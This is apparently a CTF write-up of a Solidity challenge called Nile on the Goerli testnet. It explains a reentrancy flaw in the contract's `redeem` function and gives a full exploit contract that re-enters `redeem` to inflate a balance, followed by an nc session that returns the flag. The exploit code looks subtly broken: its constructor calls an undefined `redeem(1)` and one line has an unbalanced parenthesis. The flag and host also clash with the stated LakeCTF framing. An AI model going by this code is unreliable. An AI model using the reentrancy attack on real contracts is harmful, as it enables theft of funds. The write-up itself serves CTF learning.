---
published: 2022-11-11
series: LakeCTF 2022
tags:
- Blockchain
title: Nile

---

Nile is the first of the two CTF challenges featured in the LakeCTF 2022.

The challenge is quite straightforward, we have a vulnerable contract deployed on the Goerli testnet

```Solidity
contract Nile {
    mapping(address => uint256) balance;
    mapping(address => uint256) redeemable;
    mapping(address => bool) accounts;

    event GetFlag(bytes32);
    event Redeem(address, uint256);
    event Created(address, uint256);
    
    function redeem(uint amount) public {
        require(accounts[msg.sender]);
        require(redeemable[msg.sender] > amount);

        (bool status, ) = msg.sender.call("");

        if (!status) {
            revert();
        }

        redeemable[msg.sender] -= amount;
        balance[msg.sender] += amount;
        emit Redeem(msg.sender, amount);
    }

    function createAccount() public {
        balance[msg.sender] = 0;
        redeemable[msg.sender] = 100;
        accounts[msg.sender] = true;

        emit Created(msg.sender, 100);
    }

    function deleteAccount() public {
        require(accounts[msg.sender]);
        balance[msg.sender] = 0;
        redeemable[msg.sender] = 0;
        accounts[msg.sender] = false;
    }

    function getFlag(bytes32 token) public {
        require(accounts[msg.sender]);
        require(balance[msg.sender] > 1000);

        emit GetFlag(token);
    }
}
```

In order to solve the challenge we need to triggere the `GetFlag` event

```Solidity
 function getFlag(bytes32 token) public {
        require(accounts[msg.sender]);
        require(balance[msg.sender] > 1000);

        emit GetFlag(token);
    }
```

It requires two basic conditions:

- being in the account mapping
- having more than 1000 cois

The first one is simply resolved by calling the `createAccount` method.  
For the second one we are theoretically limited to withdraw at most 100 coins, however we can see that the  
`redeem` function actually performs something weird:

```Solidity
(bool status, ) = msg.sender.call("");
```

it calls a function of the caller contract.

> [!important] With a quick google review it looks like the contract is vulnerable to reentrancy attacks.

What we need to do is to deploy another contract with a fallback method, and, when Nile calls our Exploit we call the redeem function 11 times.

```Solidity
  fallback() external {
      attack();
  }

  function attack() public {
			redeemed = redeemed + 1;
      if (redeemed > 11) { return; }
      targetContract.createAccount();
      targetContract.redeem(99);
      attack();        
  }
```

So the contract code perform the initial checks 11 times

```Solidity
require(accounts[msg.sender]);
require(redeemable[msg.sender] > amount);


(bool status, ) = msg.sender.call("");
// Loops again while Exploit.redeemed < 11
```

And then increase the credit 11 times again

```Solidity
// Executes 11 times after Exploit.redeemed >= 11
redeemable[msg.sender] -= amount;
balance[msg.sender] += amount;
emit Redeem(msg.sender, amount);
```

Putting everything together

```Solidity
contract Exploit {
    uint256 redeemed = 0;
    Nile targetContract;

    constructor (address targetAddress) public{
        targetContract = Nile(targetAddress);
				targetContract.createAccount();
        redeem(1);
    }

    function getFlag(bytes32 token) public {
        targetContract.getFlag(token));
    }

    function attack() public {
				redeemed = redeemed + 1;
        if (redeemed > 11) { return; }
        targetContract.createAccount();
        targetContract.redeem(99);
        attack();        
    }

    fallback() external {
        attack();
    }

}
```

We then use RemixIDE to upload the contract, insert the token, validate the flag and we are done!

```Bash
$ nc -v nile.chall.pwnoh.io 13379
> Connection to nile.chall.pwnoh.io port 13379 [tcp/*] succeeded!
> Hello! The contract is running at 0x7217bd381C35dd9E1B8Fcbd74eaBac4847d936af on the Goerli Testnet.
> Here is your token id: 0x0e5f322ff9c116bc51143a27b094276f
> Are you ready to receive your flag? (y/n)
$ y
> Here is the flag: buckeye{n0_s4fem4th_t1ll_s0l1d1ty_08}
```